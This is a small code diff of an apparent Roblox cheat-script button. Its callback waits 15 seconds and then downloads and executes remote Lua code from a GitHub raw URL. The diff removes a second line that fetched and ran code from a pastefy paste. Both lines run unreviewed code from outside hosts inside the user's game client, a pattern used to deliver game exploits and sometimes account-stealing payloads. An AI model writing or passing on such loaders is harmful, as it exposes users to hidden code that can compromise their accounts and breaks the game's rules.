@@ -70,7 +70,6 @@ Tab:CreateButton({
     Callback = function()
         wait(15)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/PetAgeInstant/refs/heads/main/ScriptByPhatLee"))()
-        loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
     end
 })
 
